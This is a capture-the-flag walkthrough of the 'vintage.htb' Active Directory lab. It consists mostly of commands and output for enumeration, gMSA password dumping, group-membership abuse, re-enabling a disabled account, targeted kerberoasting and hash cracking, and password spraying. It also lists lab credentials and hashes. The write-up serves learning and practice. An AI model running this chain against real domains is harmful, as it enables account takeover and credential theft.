# Initial credentials
```python
P.Rosa:Rosaisbest123
```

# Host file setup
```python
sudo nxc smb 10.129.231.205 --generate-hosts-file /etc/hosts        
[sudo] password for kali: 
SMB         10.129.231.205  445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
```
So some things to note:
- NTLM auth disabled
- SMB signing is enabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.vintage.htb      
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-02 16:28 +0100
Nmap scan report for dc01.vintage.htb (10.129.231.205)
Host is up (0.014s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49676/tcp open  unknown
49687/tcp open  unknown
52792/tcp open  unknown
62928/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.80 seconds
```

## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT dc01.vintage.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-02 16:30 +0100
Nmap scan report for dc01.vintage.htb (10.129.231.205)
Host is up (0.017s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-02 15:30:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
DC is running at -1h

# SMB (445)
Since NTLM is disabled i basically need to get a tgt

```python
nxc smb dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k            
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123
```
The creds work to make this simple though ill just generate a tgt for this save entering credentials

```python
nxc smb dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k --generate-tgt p_rosa.tgt
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123 
SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: p_rosa.tgt.ccache
SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=p_rosa.tgt.ccache
```
Now i can export it!

```python
export KRB5CCNAME=p_rosa.tgt.ccache
```
## Shares
```python
nxc smb dc01.vintage.htb --use-kcache --shares                                      
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] VINTAGE.HTB\p.rosa from ccache 
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
```
Read access on default shares
## Users
```python
nxc smb dc01.vintage.htb --use-kcache --users-export users.txt
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] VINTAGE.HTB\p.rosa from ccache 
SMB         dc01.vintage.htb 445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         dc01.vintage.htb 445    dc01             Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain
SMB         dc01.vintage.htb 445    dc01             Guest                         2024-11-13 14:16:53 0       Built-in account for guest access to the computer/domain
SMB         dc01.vintage.htb 445    dc01             krbtgt                        2024-06-05 10:27:35 0       Key Distribution Center Service Account
SMB         dc01.vintage.htb 445    dc01             M.Rossi                       2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             R.Verdi                       2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             L.Bianchi                     2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             G.Viola                       2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             C.Neri                        2024-06-05 21:08:13 0        
SMB         dc01.vintage.htb 445    dc01             P.Rosa                        2024-11-06 12:27:16 0        
SMB         dc01.vintage.htb 445    dc01             svc_sql                       2026-04-02 15:32:15 0        
SMB         dc01.vintage.htb 445    dc01             svc_ldap                      2024-06-06 13:45:27 0        
SMB         dc01.vintage.htb 445    dc01             svc_ark                       2024-06-06 13:45:27 0        
SMB         dc01.vintage.htb 445    dc01             C.Neri_adm                    2024-06-07 10:54:14 0        
SMB         dc01.vintage.htb 445    dc01             L.Bianchi_adm                 2024-11-26 11:40:30 0        
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated 14 local users: VINTAGE
SMB         dc01.vintage.htb 445    dc01             [*] Writing 14 local users to users.txt
```
Dumped all the users to a text file

AS-REP roasting and kerberoasting both failed

No usernames as passwords and no password reuse

Not a lot else i can do with SMB

# Pre-created computer account
```python
nxc smb dc01.vintage.htb -u 'fs01$' -p 'fs01' -k  
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01$:fs01
```
I ran nxc again with `--rid-brute` and found some machine accounts and ive attempted the user as password here and authenticated

# Bloodhound
![[Pasted image 20260402170551.png]]
Found outbound object control on this machine account

# Dumping gMSA password of `GMSA01$`
```python
nxc ldap dc01.vintage.htb -u 'fs01$' -p 'fs01' --gmsa -k
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\fs01$:fs01 
LDAP        dc01.vintage.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.vintage.htb 389    DC01             Account: gMSA01$              NTLM: 0851299c01b944d01099fc977eaa6c67     PrincipalsAllowedToReadPassword: Domain Computers
```
Found the NTLM hash of this computer account

# Bloodhound on `GMSA01$`
![[Pasted image 20260402170828.png]]
Ive got GenericWrite and AddSelf on the service managers group

# Adding member to `servicemanagers` group
```python
nxc smb dc01.vintage.htb -u 'GMSA01$' -H '0851299c01b944d01099fc977eaa6c67' --generate-tgt gmsa01 -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\GMSA01$:0851299c01b944d01099fc977eaa6c67 
SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: gmsa01.ccache
SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=gmsa01.ccache
```
This generated a TGT for the GMSA01$ machine account

```python
export KRB5CCNAME=gmsa01.ccache
```

```python
bloodyAD -k --host dc01.vintage.htb -d vintage.htb add groupMember servicemanagers 'GMSA01$' 
[+] GMSA01$ added to servicemanagers
```
I generated a TGT for the `GMSA01$` machine account and then added the user to the group

# Bloodhound on `servicemanagers` group
![[Pasted image 20260402172340.png]]
GenericAll over three service accounts

The `svc_sql` account is disabled

## Re-enabling `svc_sql`
```python
nxc smb dc01.vintage.htb -u 'GMSA01$' -H '0851299c01b944d01099fc977eaa6c67' --generate-tgt gmsa01 -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\GMSA01$:0851299c01b944d01099fc977eaa6c67 
SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: gmsa01.ccache
SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=gmsa01.ccache
```
Im having to regenerate the TGT since i am now in a new group

```python
bloodyAD -k --host dc01.vintage.htb -d vintage.htb remove uac 'svc_sql' -f ACCOUNTDISABLE           

[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
```
To do this i had to re-generate a TGT using nxc since the last one i generated does not contain the new group info 

# Abusing GenericAll on three service accounts
Now im in the group and have a valid TGT and `svc_sql` is enabled i can abuse this

So after trying to abuse ForceChangePassword on the three accounts and failing ill try a targeted kerberoast

```python
bloodyAD -k --host dc01.vintage.htb -d vintage.htb set object 'svc_sql' servicePrincipalName -v 'service/hacked'

[+] svc_sql's servicePrincipalName has been updated
```
So for some reason when trying this on the the other two service accounts it failed and doesnt let me update the SPN

```python
nxc ldap dc01.vintage.htb --use-kcache --kerberoasting kerb.hashes
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:VINTAGE.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] VINTAGE.HTB\p.rosa from ccache 
LDAP        dc01.vintage.htb 389    DC01             [*] Skipping disabled account: krbtgt
LDAP        dc01.vintage.htb 389    DC01             [*] Total of records returned 1
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_sql, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2026-04-02 17:32:06.597110, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$4d92468f4c7f369421448e16aa359808$2c7dfcda6f490ea1df70f69d453ca0ce321a160c4c5b2dce96b65036df0a98a9c7164d645d660d4d37d4350feac75f4c4ba309ed3d59298b08a7426f73dd13ddfde1e6117285099ee376c654e58d3ff3f75cc2590f3f89f54446eeddb7ca2f0276417150f6aa99dc052a9594e72d0da890eeb2aa548bdb8a8914e9c84d93bfe36fa0674d74e9b952623df4abcce82227cad06f4dfddabf34cfce4e21eb0225aa5715ed23ab50e28af75615440012cf7358b973c246489673ac166a50d3bbf826bcf498f446476e39ee314980b7d53ac18900536d67c9245549174b621c76cf617a4255c6c43ff901c4b18b79b94e7764e3bd2f0fe133d049147b5b36a3e6bcaa5da45a81c5a53171bba98e100f19376f229b1033ac946c29f3feaff7c7f83c69aefe9c323345a97050bccd441dcee2d72fdaf8d4e91f730bfc1eafa35462a322f6affb44982a828c3cf69eb150359dd8ded0bd27a468e90914aeae6fa37a3ca1353c4e7f47ab88db9268d2bb3da39bbd2fbd0fb5202187da503a0ed10a928fbb18c4cac0e89e486ef877f5c6ae53266d945bfe16b588bc521696e57bbd1d98241ea32517584adf68222694e2a6e0d44e749db873359bb7e23e91f295cf1e33d27cb5e5af7292bdaa64fda48ff1dd07bdab2a88b2646fb10549476b6c2158d8843cf8a929b72f63c0c6d9d07adf0bac74e0bddf544d7824b4cd82902ab9748e8c7fd8640bff5a8a3fca5fa7099324523afec5ce49c0c06acd0ddf78905858bad8588930c9d5c20e031707cf685148f380d5b02b35173e48a1e033aed299eac12bd6eed3a68082579384e0164ad3620f09f286fe225aa2a2a8fe6afbbef3437f8151fadefdc231d4b00243e805045b9df532236617ae118dbc1cf21612b0a0a76979f5ed5cbcd78c1eb45983904704e8cb5dd7aecb7891345726aebe1cf5ec8fa7e3fb8b42063df2ff3f14d092f60cec4bc24fcf323b9ce6f30e3f6451530477a9faabed1a00df6f969aeca1e96e01a2715b91d6b0661bdfe37d5191049fc3e99db8d99ae249350adf6fd2188b69feb15591071caddc45438b901a0fabe2a47dfe3836db0e643245be93f79eee068d7f18ddf1f271ab468f360a6749136c8c9c665c3e14f8f240b89f77504d5702f2a26c6ca5ac6c34e29778a6a13058753fc4a608958a8a89d3e6fe70c8f89b1fcd0fe891a3d9b1d7336ed1e1ba78e0eaa5544c8ecad11c3151a94efa621ced40467de08fa167d5eecb8cab97dbe61f2bfb074828b33ed63211629df7687ac6245f1e4e7d7f39a7e1935d1a6393e4f1076c6b30d1bd7ad5c83116775aad736e4a00bf1b93dcfa9cdb1469a08823640e07e9317b3dfe8377d9f9785889067bf7fdf01b6d2bc54dc863d1b032b25b1c02db2f01d1400957628e6c68669752415bd50f95a37defffe5cc5da79eb34a
```
Ive got a hash!
## Cracking the hash
```python
hashcat kerb.hashes /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$4d92468f4c7f369421448e16aa359808$2c7dfcda6f490ea1df70f69d453ca0ce321a160c4c5b2dce96b65036df0a98a9c7164d645d660d4d37d4350feac75f4c4ba309ed3d59298b08a7426f73dd13ddfde1e6117285099ee376c654e58d3ff3f75cc2590f3f89f54446eeddb7ca2f0276417150f6aa99dc052a9594e72d0da890eeb2aa548bdb8a8914e9c84d93bfe36fa0674d74e9b952623df4abcce82227cad06f4dfddabf34cfce4e21eb0225aa5715ed23ab50e28af75615440012cf7358b973c246489673ac166a50d3bbf826bcf498f446476e39ee314980b7d53ac18900536d67c9245549174b621c76cf617a4255c6c43ff901c4b18b79b94e7764e3bd2f0fe133d049147b5b36a3e6bcaa5da45a81c5a53171bba98e100f19376f229b1033ac946c29f3feaff7c7f83c69aefe9c323345a97050bccd441dcee2d72fdaf8d4e91f730bfc1eafa35462a322f6affb44982a828c3cf69eb150359dd8ded0bd27a468e90914aeae6fa37a3ca1353c4e7f47ab88db9268d2bb3da39bbd2fbd0fb5202187da503a0ed10a928fbb18c4cac0e89e486ef877f5c6ae53266d945bfe16b588bc521696e57bbd1d98241ea32517584adf68222694e2a6e0d44e749db873359bb7e23e91f295cf1e33d27cb5e5af7292bdaa64fda48ff1dd07bdab2a88b2646fb10549476b6c2158d8843cf8a929b72f63c0c6d9d07adf0bac74e0bddf544d7824b4cd82902ab9748e8c7fd8640bff5a8a3fca5fa7099324523afec5ce49c0c06acd0ddf78905858bad8588930c9d5c20e031707cf685148f380d5b02b35173e48a1e033aed299eac12bd6eed3a68082579384e0164ad3620f09f286fe225aa2a2a8fe6afbbef3437f8151fadefdc231d4b00243e805045b9df532236617ae118dbc1cf21612b0a0a76979f5ed5cbcd78c1eb45983904704e8cb5dd7aecb7891345726aebe1cf5ec8fa7e3fb8b42063df2ff3f14d092f60cec4bc24fcf323b9ce6f30e3f6451530477a9faabed1a00df6f969aeca1e96e01a2715b91d6b0661bdfe37d5191049fc3e99db8d99ae249350adf6fd2188b69feb15591071caddc45438b901a0fabe2a47dfe3836db0e643245be93f79eee068d7f18ddf1f271ab468f360a6749136c8c9c665c3e14f8f240b89f77504d5702f2a26c6ca5ac6c34e29778a6a13058753fc4a608958a8a89d3e6fe70c8f89b1fcd0fe891a3d9b1d7336ed1e1ba78e0eaa5544c8ecad11c3151a94efa621ced40467de08fa167d5eecb8cab97dbe61f2bfb074828b33ed63211629df7687ac6245f1e4e7d7f39a7e1935d1a6393e4f1076c6b30d1bd7ad5c83116775aad736e4a00bf1b93dcfa9cdb1469a08823640e07e9317b3dfe8377d9f9785889067bf7fdf01b6d2bc54dc863d1b032b25b1c02db2f01d1400957628e6c68669752415bd50f95a37defffe5cc5da79eb34a:Zer0the0ne
```
Cracked the hash!

```python
svc_sql:Zer0the0ne
```
Ill validate these credentials

```python
nxc smb dc01.vintage.htb -u 'svc_sql' -p 'Zer0the0ne' -k                            
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_sql:Zer0the0ne
```
This user is now compromised

# Password spray on user accounts with new password
After getting a new password for a service account its always a good idea to spray this against other users in case of password reuse. One of the users on the domain will have setup the service account so whoever did is likely to have reused the password. If that concept holds up in a CTF i will find out.....

```python
nxc smb dc01.vintage.htb -u users.txt -p 'Zer0the0ne' --continue-on-success -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```
I have indeed compromised a user using a password spray

```python
C.Neri:Zer0the0ne
```
This user is compromised

The user `c.neri` is part of the remote management users group

# Evil-winrm as `c.neri`
```python
sudo nxc smb dc01.vintage.htb -u 'c.neri' -p 'Zer0the0ne' --generate-krb5-file /etc/krb5.conf -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] krb5 conf saved to: /etc/krb5.conf
SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri:Zer0the0ne
```
I first have to make sure the krb5 file is set 